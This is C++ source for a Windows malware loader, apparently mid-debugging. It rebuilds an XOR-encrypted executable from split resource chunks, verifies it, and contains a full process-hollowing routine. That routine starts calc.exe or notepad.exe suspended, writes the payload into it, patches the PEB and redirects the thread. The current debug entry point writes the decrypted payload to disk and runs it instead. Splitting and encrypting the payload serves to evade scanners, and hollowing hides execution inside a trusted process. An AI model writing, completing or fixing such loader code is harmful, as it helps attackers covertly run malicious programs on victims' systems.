#include <windows.h>
#include <iostream>
#include <cstdint>
#include <vector>
#include <algorithm>

#pragma comment(lib, "ntdll.lib")

// ============================================================================
// STRUCTURES AND DEFINITIONS
// ============================================================================

#pragma pack(push, 1)
struct ChunkHeader {
    char magic[4];        // "FRAG" identifier
    uint32_t total_size;  // Original payload size
    uint16_t total_chunks;// Total number of chunks
    uint16_t chunk_size;  // Size of each chunk
    uint8_t encryption_key; // XOR key
    uint32_t crc32;       // Checksum for verification
    char marker[8];       // "CHUNK001" marker
};
#pragma pack(pop)

const char* REGISTRY_KEY_PATH = "Software\\MyApp\\Chunks";
const bool STORE_TO_REGISTRY = false;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

using pNtQueryInformationProcess = NTSTATUS(WINAPI*)(
    HANDLE, ULONG, PVOID, ULONG, PULONG
);

// ============================================================================
// FUNCTION DECLARATIONS
// ============================================================================

unsigned char* GetPayloadResource(int id, const char* type, DWORD* size);
std::vector<char> ReconstructFragmentedPayload();
bool ValidateAndExecutePayload(char* payload, uint32_t payloadSize);
uint32_t CalculateCRC32(const char* data, size_t length);
bool StoreDecryptedPayloadToRegistry(const char* payload, uint32_t size);

// ============================================================================
// MAIN EXECUTION
// ============================================================================

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    
    std::vector<char> reconstructedPayload = ReconstructFragmentedPayload();
    
    if (reconstructedPayload.empty()) {
        MessageBoxA(NULL, "Failed to reconstruct payload from resources", "Error", MB_ICONERROR);
        return -1;
    }

    // DEBUG: Save reconstructed payload to file and test it
    FILE* testFile = fopen("reconstructed_test.exe", "wb");
    if (testFile) {
        fwrite(reconstructedPayload.data(), 1, reconstructedPayload.size(), testFile);
        fclose(testFile);
        
        // Try to execute the reconstructed file directly
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (CreateProcessA("reconstructed_test.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            MessageBoxA(NULL, "SUCCESS: Reconstructed payload runs correctly!\nThe issue is in process hollowing.", "Debug", MB_OK);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            MessageBoxA(NULL, "FAILED: Reconstructed payload cannot run.\nThe issue is in reconstruction.", "Debug", MB_ICONERROR);
        }
    }

    // Don't even try process hollowing for now
    // MessageBoxA(NULL, "Stopping here for debugging", "Debug", MB_OK);
    
    return 0;
}

// ============================================================================
// FUNCTION IMPLEMENTATIONS
// ============================================================================

unsigned char* GetPayloadResource(int id, const char* type, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    
    char debugMsg[256];
    sprintf(debugMsg, "Looking for resource: ID=%d, Type=%s", id, type);
    MessageBoxA(NULL, debugMsg, "GetPayloadResource", MB_OK);
    
    HRSRC hRes = FindResourceA(hModule, MAKEINTRESOURCEA(id), type);
    if (!hRes) {
        DWORD error = GetLastError();
        char errMsg[256];
        sprintf(errMsg, "FindResource failed. Error: %lu", error);
        MessageBoxA(NULL, errMsg, "GetPayloadResource", MB_ICONERROR);
        return nullptr;
    }
    
    HGLOBAL hData = LoadResource(hModule, hRes);
    if (!hData) {
        MessageBoxA(NULL, "LoadResource failed", "GetPayloadResource", MB_ICONERROR);
        return nullptr;
    }

    void* pData = LockResource(hData);
    if (!pData) {
        MessageBoxA(NULL, "LockResource failed", "GetPayloadResource", MB_ICONERROR);
        return nullptr;
    }

    *size = SizeofResource(hModule, hRes);
    
    char successMsg[256];
    sprintf(successMsg, "Resource loaded: %lu bytes", *size);
    MessageBoxA(NULL, successMsg, "GetPayloadResource", MB_OK);
    
    return reinterpret_cast<unsigned char*>(pData);
}

bool StoreDecryptedPayloadToRegistry(const char* payload, uint32_t size) {
    HKEY hKey;
    LONG result;
    
    result = RegCreateKeyExA(HKEY_CURRENT_USER, REGISTRY_KEY_PATH, 0, NULL, 
                            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS) {
        return false;
    }

    result = RegSetValueExA(hKey, "decrypted_payload", 0, REG_BINARY, 
                           (const BYTE*)payload, size);
    
    DWORD payloadSize = size;
    RegSetValueExA(hKey, "payload_size", 0, REG_DWORD, 
                   (const BYTE*)&payloadSize, sizeof(payloadSize));

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

std::vector<char> ReconstructFragmentedPayload() {
    
    HMODULE hModule = GetModuleHandle(NULL);
    char debugMsg[512];
    
    if (!hModule) {
        MessageBoxA(NULL, "GetModuleHandle failed", "Debug", MB_ICONERROR);
        return {};
    }
    
    char exePath[MAX_PATH];
    GetModuleFileNameA(hModule, exePath, MAX_PATH);
    sprintf(debugMsg, "Running from: %s", exePath);
    MessageBoxA(NULL, debugMsg, "Debug Info", MB_OK);
    
    // Test FindResource directly
    HRSRC hResTest = FindResourceA(hModule, MAKEINTRESOURCEA(132), "BIN");
    if (!hResTest) {
        DWORD error = GetLastError();
        sprintf(debugMsg, "FindResource failed for ID 132\nError code: %lu", error);
        MessageBoxA(NULL, debugMsg, "Resource Debug", MB_ICONERROR);
        
        EnumResourceNamesA(hModule, "BIN", [](HMODULE hModule, LPCSTR lpszType, LPSTR lpszName, LONG_PTR lParam) -> BOOL {
            char msg[256];
            if (IS_INTRESOURCE(lpszName)) {
                sprintf(msg, "Found BIN resource: ID %d", (int)(ULONG_PTR)lpszName);
            } else {
                sprintf(msg, "Found BIN resource: %s", lpszName);
            }
            MessageBoxA(NULL, msg, "Available Resources", MB_OK);
            return TRUE;
        }, 0);
        
        return {};
    }
    
    DWORD testSize = SizeofResource(hModule, hResTest);
    sprintf(debugMsg, "Resource 132 found! Size: %lu bytes", testSize);
    MessageBoxA(NULL, debugMsg, "Resource Debug", MB_OK);
    
    HGLOBAL hDataTest = LoadResource(hModule, hResTest);
    if (!hDataTest) {
        DWORD error = GetLastError();
        sprintf(debugMsg, "LoadResource failed. Error: %lu", error);
        MessageBoxA(NULL, debugMsg, "Resource Debug", MB_ICONERROR);
        return {};
    }
    
    void* pDataTest = LockResource(hDataTest);
    if (!pDataTest) {
        MessageBoxA(NULL, "LockResource failed", "Resource Debug", MB_ICONERROR);
        return {};
    }
    
    MessageBoxA(NULL, "All resource tests passed!", "Resource Debug", MB_OK);

    // === STEP 1: Load chunk 0 using our function ===
    DWORD chunk0Size = 0;
    unsigned char* chunk0Data = GetPayloadResource(132, "BIN", &chunk0Size);
    
    if (!chunk0Data) {
        MessageBoxA(NULL, "GetPayloadResource failed after successful manual test", "Step 1", MB_ICONERROR);
        return {};
    }
    
    sprintf(debugMsg, "GetPayloadResource success! Size: %lu bytes", chunk0Size);
    MessageBoxA(NULL, debugMsg, "Step 1", MB_OK);
    
    if (chunk0Size < sizeof(ChunkHeader)) {
        sprintf(debugMsg, "Chunk 0 too small for header: %lu bytes, need %zu bytes", 
                chunk0Size, sizeof(ChunkHeader));
        MessageBoxA(NULL, debugMsg, "Step 1", MB_ICONERROR);
        return {};
    }
    
    size_t expectedChunk0Size = sizeof(ChunkHeader) + 4096;
    sprintf(debugMsg, "Chunk 0 size: %lu bytes, expected: %zu bytes", chunk0Size, expectedChunk0Size);
    MessageBoxA(NULL, debugMsg, "Size Check", MB_OK);
    
    if (chunk0Size != expectedChunk0Size) {
        sprintf(debugMsg, "Chunk 0 size mismatch!\nGot: %lu bytes\nExpected: %zu bytes\nHeader size: %zu bytes", 
                chunk0Size, expectedChunk0Size, sizeof(ChunkHeader));
        MessageBoxA(NULL, debugMsg, "Step 1", MB_ICONWARNING);
    }
    
    // === STEP 2: Extract header ===
    ChunkHeader* header = (ChunkHeader*)chunk0Data;
    
    if (memcmp(header->magic, "FRAG", 4) != 0) {
        char magicBytes[5] = {0};
        memcpy(magicBytes, header->magic, 4);
        sprintf(debugMsg, "Invalid FRAG magic. Got: '%s' (0x%02X%02X%02X%02X)", 
                magicBytes, 
                (unsigned char)header->magic[0],
                (unsigned char)header->magic[1], 
                (unsigned char)header->magic[2],
                (unsigned char)header->magic[3]);
        MessageBoxA(NULL, debugMsg, "Step 2", MB_ICONERROR);
        return {};
    }
    
    if (memcmp(header->marker, "CHUNK001", 8) != 0) {
        char markerBytes[9] = {0};
        memcpy(markerBytes, header->marker, 8);
        sprintf(debugMsg, "Invalid CHUNK001 marker. Got: '%s'", markerBytes);
        MessageBoxA(NULL, debugMsg, "Step 2", MB_ICONERROR);
        return {};
    }
    
    sprintf(debugMsg, "Header valid!\nTotal size: %u\nTotal chunks: %u\nChunk size: %u", 
            header->total_size, header->total_chunks, header->chunk_size);
    MessageBoxA(NULL, debugMsg, "Step 2", MB_OK);

    // === STEP 3: Prepare reconstruction ===
    int chunk0DataSize = chunk0Size - sizeof(ChunkHeader);
    char* chunk0Payload = (char*)(chunk0Data + sizeof(ChunkHeader));
    
    sprintf(debugMsg, "Chunk 0 data size: %d bytes", chunk0DataSize);
    MessageBoxA(NULL, debugMsg, "Step 3", MB_OK);
    
    if (chunk0DataSize > header->chunk_size) {
        sprintf(debugMsg, "Chunk 0 data larger than expected: %d > %u", 
                chunk0DataSize, header->chunk_size);
        MessageBoxA(NULL, debugMsg, "Step 3", MB_ICONERROR);
        return {};
    }

    // === STEP 4: Reconstruct all data ===
    std::vector<char> allEncryptedData;

    // Add data from chunk 0 (already skipped header)
    allEncryptedData.insert(allEncryptedData.end(), chunk0Payload, chunk0Payload + chunk0DataSize);

    // Add data from remaining chunks (NO HEADERS in these chunks)
    for (int chunkId = 1; chunkId < header->total_chunks; chunkId++) {
        int resourceId = 132 + chunkId;
        sprintf(debugMsg, "Loading chunk %d (resource ID %d)...", chunkId, resourceId);
        MessageBoxA(NULL, debugMsg, "Step 4", MB_OK);
        
        DWORD chunkSize = 0;
        unsigned char* chunkData = GetPayloadResource(resourceId, "BIN", &chunkSize);
        
        if (!chunkData) {
            sprintf(debugMsg, "Failed to load chunk %d (ID %d)", chunkId, resourceId);
            MessageBoxA(NULL, debugMsg, "Step 4", MB_ICONERROR);
            return {};
        }
        
        // NO HEADER SKIPPING for chunks 1+ - they contain pure encrypted data
        allEncryptedData.insert(allEncryptedData.end(), chunkData, chunkData + chunkSize);
        
        sprintf(debugMsg, "Added chunk %d: %lu bytes, total: %zu bytes", 
                chunkId, chunkSize, allEncryptedData.size());
        MessageBoxA(NULL, debugMsg, "Step 4", MB_OK);
    }

    // === STEP 5: Verify total size ===
    sprintf(debugMsg, "Final size: %zu bytes, expected: %u bytes", 
            allEncryptedData.size(), header->total_size);
    MessageBoxA(NULL, debugMsg, "Step 5", MB_OK);
    
    if (allEncryptedData.size() != header->total_size) {
        sprintf(debugMsg, "Total size mismatch!\nGot: %zu bytes\nExpected: %u bytes", 
                allEncryptedData.size(), header->total_size);
        MessageBoxA(NULL, debugMsg, "Step 5", MB_ICONERROR);
        return {};
    }
    
    MessageBoxA(NULL, "Success: Total size correct", "Step 5", MB_OK);

    // === STEP 6: Decrypt ===
    std::vector<char> decryptedPayload(header->total_size);
    for (uint32_t i = 0; i < header->total_size; i++) {
        decryptedPayload[i] = allEncryptedData[i] ^ header->encryption_key;
    }
    
    MessageBoxA(NULL, "Success: Decryption complete", "Step 6", MB_OK);

    // Check first bytes
    char byteCheck[256];
    sprintf(byteCheck, "First bytes check:\nDecrypted: %02X %02X\nShould be: 4D 5A ('MZ')",
            (unsigned char)decryptedPayload[0], 
            (unsigned char)decryptedPayload[1]);
    MessageBoxA(NULL, byteCheck, "Byte Verification", MB_OK);

    // Manual PE signature check
    if (decryptedPayload[0] != 'M' || decryptedPayload[1] != 'Z') {
        MessageBoxA(NULL, "PE SIGNATURE MISMATCH!", "CRITICAL ERROR", MB_ICONERROR);
        return {};
    }

    // Check header values
    char headerInfo[256];
    sprintf(headerInfo, "Header Info:\nExpected CRC: 0x%08X\nTotal Size: %u\nTotal Chunks: %u",
            header->crc32, header->total_size, header->total_chunks);
    MessageBoxA(NULL, headerInfo, "Header Debug", MB_OK);

    // === STEP 7: Verify CRC ===
    uint32_t calculatedCRC = CalculateCRC32(decryptedPayload.data(), header->total_size);
    
    char crcMsg[256];
    sprintf(crcMsg, "CRC Result:\nCalculated: 0x%08X\nExpected: 0x%08X\nMatch: %s",
            calculatedCRC, header->crc32, 
            (calculatedCRC == header->crc32) ? "YES" : "NO");
    MessageBoxA(NULL, crcMsg, "CRC Check", MB_OK);
    
    if (calculatedCRC != header->crc32) {
        MessageBoxA(NULL, "CRC CHECK FAILED!", "ERROR", MB_ICONERROR);
        return {};
    }
    
    MessageBoxA(NULL, "Success: CRC check passed", "Step 7", MB_OK);

    return decryptedPayload;
}

uint32_t CalculateCRC32(const char* data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= (uint32_t)data[i];
        for (int j = 0; j < 8; j++) {
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
        }
    }
    return ~crc;
}

bool ValidateAndExecutePayload(char* payload, uint32_t payloadSize) {
    
    // === STEP 1: Validate PE signature ===
    if (payload[0] != 'M' || payload[1] != 'Z') {
        MessageBoxA(NULL, "Invalid PE signature", "Error", MB_ICONERROR);
        return false;
    }

    // === STEP 2: Parse PE headers ===
    BYTE* pe = (BYTE*)payload;
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)pe;
    IMAGE_NT_HEADERS64* ntHeader = (IMAGE_NT_HEADERS64*)(pe + dosHeader->e_lfanew);
    
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
        MessageBoxA(NULL, "Invalid NT signature", "Error", MB_ICONERROR);
        return false;
    }

    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeader);

    // === STEP 3: Create suspended process ===
    PROCESS_INFORMATION processInfo;
    STARTUPINFOA startupInfo = { sizeof(startupInfo) };
    
    const char* targets[] = {
        "C:\\Windows\\System32\\calc.exe",
        "C:\\Windows\\System32\\notepad.exe",
        NULL
    };
    
    bool processCreated = false;
    for (int i = 0; targets[i] != NULL; i++) {
        if (CreateProcessA(NULL, (LPSTR)targets[i], NULL, NULL, FALSE,
            CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo)) {
            processCreated = true;
            break;
        }
    }
    
    if (!processCreated) {
        MessageBoxA(NULL, "Failed to create any target process", "Error", MB_ICONERROR);
        return false;
    }

    CONTEXT threadContext = {};
    threadContext.ContextFlags = CONTEXT_FULL | CONTEXT_INTEGER | CONTEXT_CONTROL;
    
    if (!GetThreadContext(processInfo.hThread, &threadContext)) {
        MessageBoxA(NULL, "Failed to get thread context", "Error", MB_ICONERROR);
        TerminateProcess(processInfo.hProcess, 0);
        return false;
    }

    // === STEP 4: Allocate memory in target process ===
    LPVOID remoteMemory = VirtualAllocEx(processInfo.hProcess,
        (LPVOID)ntHeader->OptionalHeader.ImageBase,
        ntHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!remoteMemory) {
        remoteMemory = VirtualAllocEx(processInfo.hProcess, NULL,
            ntHeader->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
        
        if (!remoteMemory) {
            MessageBoxA(NULL, "Failed to allocate remote memory", "Error", MB_ICONERROR);
            TerminateProcess(processInfo.hProcess, 0);
            return false;
        }
        ntHeader->OptionalHeader.ImageBase = (ULONGLONG)remoteMemory;
    }

    // === STEP 5: Apply base relocations ===
    ULONGLONG delta = (ULONGLONG)remoteMemory - ntHeader->OptionalHeader.ImageBase;
    if (delta != 0 && ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        IMAGE_DATA_DIRECTORY relocDir = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(pe + relocDir.VirtualAddress);
        SIZE_T processed = 0;

        while (processed < relocDir.Size) {
            DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* relocData = (WORD*)(reloc + 1);

            for (DWORD i = 0; i < count; ++i) {
                DWORD type = relocData[i] >> 12;
                DWORD offset = relocData[i] & 0xFFF;

                if (type == IMAGE_REL_BASED_DIR64) {
                    ULONGLONG* patchAddr = (ULONGLONG*)(pe + reloc->VirtualAddress + offset);
                    *patchAddr += delta;
                }
            }

            processed += reloc->SizeOfBlock;
            reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
        }
    }

    // === STEP 6: Write PE to remote process ===
    SIZE_T bytesWritten = 0;
    
    WriteProcessMemory(processInfo.hProcess, remoteMemory, pe, 
                      ntHeader->OptionalHeader.SizeOfHeaders, &bytesWritten);

    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; ++i) {
        LPVOID sectionDest = (BYTE*)remoteMemory + sections[i].VirtualAddress;
        LPVOID sectionSrc = pe + sections[i].PointerToRawData;
        SIZE_T sectionSize = std::max(sections[i].SizeOfRawData, sections[i].Misc.VirtualSize);

        BYTE* paddedSection = new BYTE[sectionSize];
        ZeroMemory(paddedSection, sectionSize);
        memcpy(paddedSection, sectionSrc, sections[i].SizeOfRawData);

        WriteProcessMemory(processInfo.hProcess, sectionDest, paddedSection, sectionSize, &bytesWritten);
        delete[] paddedSection;
    }

    // === STEP 7: Update PEB and execute ===
    PROCESS_BASIC_INFORMATION processInfoStruct = {};
    auto NtQueryInfoProcess = (pNtQueryInformationProcess)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    if (NtQueryInfoProcess) {
        if (NtQueryInfoProcess(processInfo.hProcess, 0, &processInfoStruct, sizeof(processInfoStruct), NULL) == 0) {
            PVOID pebImageBaseAddr = (BYTE*)processInfoStruct.PebBaseAddress + 0x10;
            WriteProcessMemory(processInfo.hProcess, pebImageBaseAddr, 
                              &ntHeader->OptionalHeader.ImageBase, sizeof(ULONGLONG), NULL);
        }
    }

    threadContext.Rip = (ULONGLONG)remoteMemory + ntHeader->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(processInfo.hThread, &threadContext);

    FlushInstructionCache(processInfo.hProcess, remoteMemory, ntHeader->OptionalHeader.SizeOfImage);
    ResumeThread(processInfo.hThread);
    
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);
    return true;
}